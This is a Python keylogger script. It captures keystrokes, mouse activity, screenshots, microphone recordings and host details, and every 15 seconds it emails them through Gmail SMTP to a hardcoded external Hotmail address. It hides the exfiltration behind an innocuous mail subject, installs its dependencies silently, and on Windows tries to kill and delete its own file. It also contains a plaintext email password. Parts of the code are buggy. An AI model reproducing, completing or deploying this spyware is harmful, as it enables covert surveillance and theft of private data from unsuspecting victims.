from email.message import EmailMessage
import imghdr

try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
    import ssl
    from pynput import mouse
except ModuleNotFoundError:
    from subprocess import call

    modules = ["pyscreenshot", "sounddevice", "pynput"]
    call("pip install " + ' '.join(modules), shell=True)


finally:
    EMAIL_ADDRESS = "3muharremcandan@gmail.com"
    EMAIL_PASSWORD = "bfhzrcursrxhoopj"
    SEND_REPORT_EVERY = 15  # as in seconds


    class KeyLogger:

        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started..."
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string

        def on_move(self, x, y):
            current_move = logging.info("Mouse moved to {} {}".format(x, y))
            print(current_move)
            self.appendlog(current_move)

        def on_click(self, x, y):
            current_click = logging.info("Mouse moved to {} {}".format(x, y))
            print(current_click)
            self.appendlog(current_click)

        def on_scroll(self, x, y):
            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key)

        def send_mail2(self, email, password, message):

            Sender_Email = "3muharremcandan@gmail.com"
            Reciever_Email = "s_05_60@hotmail.com"

            newMessage = EmailMessage()
            newMessage['Subject'] = "Check out the new logo"
            newMessage['From'] = Sender_Email
            newMessage['To'] = Reciever_Email
            newMessage.set_content(message)
            with open('a.png', 'rb') as f:
                image_data = f.read()
                image_type = imghdr.what(f.name)
                image_name = f.name
            newMessage.add_attachment(image_data, maintype='image', subtype=image_type, filename=image_name)

            context = ssl.create_default_context()
            with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:
                server.login(email, password)
                server.send_message(newMessage)

        def send_mail(self, email, password, message):
            sender = "3muharremcandan@gmail.com"
            receiver = "s_05_60@hotmail.com"

            context = ssl.create_default_context()
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, message)

        def report(self):
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)

        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            obj.writeframesraw(myrecording)
            sd.wait()

            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)

        def screenshot(self):
            img = pyscreenshot.grab()
            img.save("a.png")
            self.send_mail2(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message="Yeni Görüntü")
            timer = threading.Timer(self.interval, self.screenshot)
            timer.start()

        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()

                self.screenshot()

                keyboard_listener.join()

            mouse_Listener = mouse.Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll)
            with mouse_Listener:
                self.report()
            mouse_Listener.start()

            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(_file_))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(_file_))
                except OSError:
                    print('File is close.')

            else:
                pass
                # try:
                #     pwd = os.path.abspath(os.getcwd())
                #     os.system("cd " + pwd)
                #     os.system('pkill leafpad')
                #     os.system("chattr -i " + os.path.basename(_file_))
                #     print('File was closed.')
                #     os.system("rm -rf" + os.path.basename(_file_))
                # except OSError:
                #     print('File is close.')


    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()

